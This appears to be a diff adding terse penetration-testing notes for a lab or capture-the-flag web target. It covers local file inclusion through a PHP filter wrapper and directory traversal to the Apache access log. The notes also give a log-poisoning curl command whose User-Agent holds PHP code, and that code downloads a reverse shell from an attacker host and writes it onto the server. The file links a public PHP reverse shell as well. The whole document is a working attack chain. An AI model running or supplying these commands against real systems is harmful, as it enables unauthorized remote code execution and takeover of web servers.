@@ -1,0 +1,8 @@
+php://filter/read=convert.base64-encode/resource=./dog/../index
+curl -s "http://10.10.197.237/?view=./dog/../../../../var/log/apache2/access.log&ext
+
+php reverse shell PHP
+https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+
+curl -A "<?php file_put_contents('reverse.php', file_get_contents('http://10.10.8.233/reverse.php')); ?>" \
+   "http://10.10.208.134/?view=./dog/../../../../var/log/apache2/access.log&ext"
